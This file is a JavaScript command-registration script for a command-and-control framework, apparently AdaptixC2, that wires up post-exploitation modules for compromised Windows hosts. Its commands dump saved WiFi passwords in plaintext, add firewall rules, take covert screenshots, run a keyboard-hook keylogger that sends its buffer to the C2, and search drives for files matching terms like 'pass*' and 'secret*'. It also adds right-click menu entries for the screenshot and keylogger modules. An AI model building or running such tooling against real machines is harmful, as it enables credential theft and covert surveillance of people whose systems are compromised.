var metadata = {
    name: "PostEx-BOF",
    description: "BOFs for post exploitation"
};

/// COMMANDS

// ***************** wifi *****************

var _cmd_wifi_enum = ax.create_command(
    "enum",
    "List WiFi profiles saved on the system. [NOISE: low]",
    "wifi enum");
_cmd_wifi_enum.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var bof_path = ax.script_dir() + "_bin/wifidump_enum." + ax.arch(id) + ".o";
    if (!ax.file_exists(bof_path)) {
        ax.console_message(id, "BOF not found: " + bof_path, "error",
            "Compile wifidump.c and place the .o files under _bin/ next to this script.");
        return;
    }
    ax.execute_alias(id, cmdline,
        `execute bof ${bof_path}`,
        "Task: WiFi profile enumeration (BOF)", null);
});

var _cmd_wifi_dump = ax.create_command(
    "dump",
    "Retrieve the plaintext password from a saved WiFi profile. [NOISE: low]",
    "wifi dump \"NetworkName\"");
_cmd_wifi_dump.addArgString("profile", true, "Exact WiFi profile name (case-sensitive)");
_cmd_wifi_dump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var profile = parsed_json["profile"] || "";
    if (!profile) {
        ax.console_message(id, "Profile name is missing.", "error",
            "Usage: wifi dump \"NetworkName\"");
        return;
    }
    var bof_path   = ax.script_dir() + "_bin/wifidump_dump." + ax.arch(id) + ".o";
    var bof_params = ax.bof_pack("wstr", [profile]);
    if (!ax.file_exists(bof_path)) {
        ax.console_message(id, "BOF not found: " + bof_path, "error",
            "Compile wifidump.c and place the .o files under _bin/ next to this script.");
        return;
    }
    var hook = function (task) {
        if (!task.text || task.text.indexOf("<WLANProfile") === -1) return task;
        function xmlTag(tag, text) {
            var re = new RegExp("<" + tag + "[^>]*>([^<]*)<\\/" + tag + ">");
            var m = re.exec(text);
            return m ? m[1].trim() : null;
        }
        var ifaceMatch = /\[\+\] Profile XML \(([^)]+)\)/.exec(task.text);
        var iface    = ifaceMatch ? ifaceMatch[1] : "unknown";
        var ssid     = xmlTag("name",           task.text);
        var auth     = xmlTag("authentication", task.text);
        var enc      = xmlTag("encryption",     task.text);
        var keyType  = xmlTag("keyType",        task.text);
        var password = xmlTag("keyMaterial",    task.text);
        var prot     = xmlTag("protected",      task.text);
        var out  = "\n[WiFi Credential Dump]\n";
        out += "  Interface : " + iface + "\n";
        out += "  SSID      : " + (ssid    || "?") + "\n";
        out += "  Auth      : " + (auth    || "?") + "\n";
        out += "  Encryption: " + (enc     || "?") + "\n";
        out += "  Key type  : " + (keyType || "?") + "\n";
        out += "  Password  : " + (prot === "true"
            ? "(protected — requires SYSTEM to read in plaintext)"
            : (password || "(not set / open network)")) + "\n";
        task.text = out;
        return task;
    };
    ax.execute_alias_hook(id, cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: WiFi dump '" + profile + "' (BOF)", hook);
});

var _cmd_wifi_auth = ax.create_command(
    "auth",
    "Connect to a WPA2-PSK network by registering a profile and calling WlanConnect. [NOISE: medium]",
    "wifi auth \"NetworkName\" \"password\"");
_cmd_wifi_auth.addArgString("ssid",     true, "Target network SSID (case-sensitive)");
_cmd_wifi_auth.addArgString("password", true, "WPA2-PSK password (minimum 8 characters)");
_cmd_wifi_auth.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var ssid = parsed_json["ssid"]     || "";
    var pass = parsed_json["password"] || "";
    if (!ssid) {
        ax.console_message(id, "SSID is missing.", "error",
            "Usage: wifi auth \"NetworkName\" \"password\"");
        return;
    }
    if (pass.length < 8) {
        ax.console_message(id, "WPA2-PSK password must be at least 8 characters long.", "error", "");
        return;
    }
    var bof_path   = ax.script_dir() + "_bin/wifidump_auth." + ax.arch(id) + ".o";
    var bof_params = ax.bof_pack("wstr,wstr", [ssid, pass]);
    if (!ax.file_exists(bof_path)) {
        ax.console_message(id, "BOF not found: " + bof_path, "error",
            "Compile wifidump.c and place the .o files under _bin/ next to this script.");
        return;
    }
    ax.execute_alias(id, cmdline,
        `execute bof ${bof_path} ${bof_params}`,
        "Task: WiFi auth -> '" + ssid + "' (BOF)", null);
});


// *************** wifi end ***************


var _cmd_fw_add = ax.create_command("add", "Add a new inbound or outbound firewall rule using COM", "firewallrule add 80 RuleName in -g Group1 -d TestRule");
_cmd_fw_add.addArgString("port", true);
_cmd_fw_add.addArgString("rulename", true);
_cmd_fw_add.addArgString("direction", "", "in");
_cmd_fw_add.addArgFlagString("-g", "rulegroup", "", "");
_cmd_fw_add.addArgFlagString("-d", "description", "", "");
_cmd_fw_add.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let direction   = parsed_json["direction"];
    let port        = parsed_json["port"];
    let rulename    = parsed_json["rulename"];
    let rulegroup   = parsed_json["rulegroup"];
    let description = parsed_json["description"];

    let bof_params = ax.bof_pack("cstr,wstr,wstr,wstr,wstr", [direction, port, rulename, rulegroup, description]);
    let bof_path = ax.script_dir() + "_bin/addfirewallrule." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Add firewall rule (BOF)");
});
var cmd_fw = ax.create_command("firewallrule", "Managing firewall rules");
cmd_fw.addSubCommands([_cmd_fw_add]);



var cmd_screenshot = ax.create_command("screenshot_bof", "Alternative screenshot capability that does not do fork n run by @codex_tf2", "screenshot -n screen1 -p 812");
cmd_screenshot.addArgFlagString("-n", "note", "Screenshot caption", "ScreenshotBOF");
cmd_screenshot.addArgFlagInt("-p", "pid", "PID of the application whose window screenshot will be taken. If 0, then a full-screen screenshot", 0);
cmd_screenshot.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let note = parsed_json["note"];
    let pid  = parsed_json["pid"];

    let bof_params = ax.bof_pack("cstr,int", [note, pid]);
    let bof_path = ax.script_dir() + "_bin/Screenshot." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "Task: Screenshot BOF");
});



var cmd_keylog_start = ax.create_command("start", "Start async keylogger (WH_KEYBOARD_LL). Captures keystrokes with window context and timestamps. Use keylog_dump to retrieve. [NOISE: medium]", "keylog_start | keylog_start 256");
cmd_keylog_start.addArgInt("buffer_kb", false, "Buffer size in KB (default: 64, max: 4096)")
cmd_keylog_start.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var buf_kb   = parsed_json["buffer_kb"] || 64;
    var bof_path = ax.script_dir() + "_bin/keylog_start_bof." + ax.arch(id) + ".o";
    var bof_params = ax.bof_pack("int", [buf_kb]);

    ax.execute_alias(id, cmdline, `execute bof -a ${bof_path} ${bof_params}`, "Task: Keylogger start (" + buf_kb + "KB buffer)", null);
});

var cmd_keylog_dump = ax.create_command("dump", "Flush current keylogger buffer to C2 and reset it. Does not stop the keylogger. [NOISE: none]", "keylog_dump");
cmd_keylog_dump.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var bof_path = ax.script_dir() + "_bin/keylog_dump_bof." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "Task: Keylogger dump", null);
});

var cmd_keylog_stop = ax.create_command("stop", "Stop keylogger, perform final buffer dump and clean up shared memory objects. [NOISE: none]", "keylog_stop");
cmd_keylog_stop.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    var bof_path = ax.script_dir() + "_bin/keylog_stop_bof." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "Task: Keylogger stop", null);
});

var cmd_keylog = ax.create_command("keylog", "Keylogger manager");
cmd_keylog.addSubCommands([cmd_keylog_start, cmd_keylog_dump, cmd_keylog_stop]);



var cmd_sauroneye = ax.create_command("sauroneye", "Search directories for files containing specific keywords (SauronEye ported to BOF by @shashinma)", "sauroneye -d C:\\Users -f .txt,.docx -k pass*,secret*");
cmd_sauroneye.addArgBool("--async", "Use Async BOF");
cmd_sauroneye.addArgFlagString("-d", "directories", "Comma-separated list of directories to search (default: C:\\)", "C:\\");
cmd_sauroneye.addArgFlagString("-f", "filetypes", "Comma-separated list of file extensions to search (default: .txt,.docx)", ".txt,.docx");
cmd_sauroneye.addArgFlagString("-k", "keywords", "Comma-separated list of keywords (supports wildcards * ). If not specified, matches all filenames", "");
cmd_sauroneye.addArgBool("-c", "Search file contents for keywords (supports wildcards * )");
cmd_sauroneye.addArgFlagInt("-m", "maxfilesize", "Max file size to search contents in, in kilobytes (default: 1024)", 1024);
cmd_sauroneye.addArgBool("-s",                      "Search in system directories (Windows and AppData)");
cmd_sauroneye.addArgFlagString("-b", "beforedate",  "Filter files last modified before this date (format: dd.MM.yyyy)", "");
cmd_sauroneye.addArgFlagString("-a", "afterdate",   "Filter files last modified after this date (format: dd.MM.yyyy)", "");
cmd_sauroneye.addArgBool("-v",                      "Check if Office files contain VBA macros using OOXML detection (no OLE, stealthier)");
cmd_sauroneye.addArgBool("-D", "Show file creation and modification dates in output (format: [C:dd.MM.yyyy M:dd.MM.yyyy])");
cmd_sauroneye.addArgFlagInt("-W", "wildcardattempts", "Maximum pattern matching attempts for wildcard search (default: 1000). Increase for complex patterns", 1000);
cmd_sauroneye.addArgFlagInt("-S", "wildcardsize", "Maximum search area in KB for large files when using wildcards (default: 200KB). Increase to search more", 200);
cmd_sauroneye.addArgFlagInt("-B", "wildcardbacktrack", "Maximum backtracking operations for wildcard matching (default: 1000). Increase for complex patterns", 1000);
cmd_sauroneye.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let directories = parsed_json["directories"];
    let filetypes = parsed_json["filetypes"];
    let keywords = parsed_json["keywords"];
    let search_contents = (parsed_json["-c"]) ? 1 : 0;
    let max_filesize = parsed_json["maxfilesize"];
    let system_dirs = (parsed_json["-s"]) ? 1 : 0;
    let before_date = parsed_json["beforedate"];
    let after_date = parsed_json["afterdate"];
    let check_macro = (parsed_json["-v"]) ? 1 : 0;
    let show_date = (parsed_json["-D"]) ? 1 : 0;
    let wildcard_attempts = parsed_json["wildcardattempts"];
    let wildcard_size = parsed_json["wildcardsize"];
    let wildcard_backtrack = parsed_json["wildcardbacktrack"];
    let async = "";
    if (parsed_json["--async"]) async = "-a ";

    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,int,int,int,cstr,cstr,int,int,int,int,int", [cmdline, directories, filetypes, keywords, search_contents, max_filesize, system_dirs, before_date, after_date, check_macro, show_date, wildcard_attempts, wildcard_size, wildcard_backtrack]);
    let bof_path = ax.script_dir() + "_bin/sauroneye." + ax.arch(id) + ".o";

    ax.execute_alias(id, cmdline, `execute bof ${async}"${bof_path}" ${bof_params}`, "Task: SauronEye file search");
});

var cmd_wifi = ax.create_command(
    "wifi",
    "WiFi enumeration, dump & authentication via WLAN API.",
    "wifi enum | wifi dump \"NetworkName\" | wifi auth \"NetworkName\" \"password\"");
cmd_wifi.addSubCommands([_cmd_wifi_enum, _cmd_wifi_dump, _cmd_wifi_auth]);


var b_group_test = ax.create_commands_group("PostEx-BOF", [cmd_fw, cmd_keylog, cmd_screenshot, cmd_sauroneye, cmd_wifi]);
ax.register_commands_group(b_group_test, ["beacon", "gopher", "kharon"], ["windows"], []);

/// MENU

let screen_access_action = menu.create_action("Screenshot", function(agents_id) { agents_id.forEach(id => ax.execute_command(id, "screenshot_bof")) });
menu.add_session_access(screen_access_action, ["beacon"]);
let g_screen_access_action = menu.create_action("Screenshot", function(agents_id) { agents_id.forEach(id => ax.execute_command(id, "screenshot")) });
menu.add_session_access(g_screen_access_action, ["gopher"]);

let keylog_start_action = menu.create_action("Start", function(value) { value.forEach(v => ax.execute_command(v, "keylog start")) });
let keylog_dump_action  = menu.create_action("Dump",  function(value) { value.forEach(v => ax.execute_command(v, "keylog dump")) });
let keylog_stop_action  = menu.create_action("Stop",  function(value) { value.forEach(v => ax.execute_command(v, "keylog stop")) });
let keylog_menu = menu.create_menu("Keylogger");
keylog_menu.addItem(keylog_start_action)
keylog_menu.addItem(keylog_dump_action)
keylog_menu.addItem(keylog_stop_action)
menu.add_session_access(keylog_menu, ["beacon", "gopher"], ["windows"]);
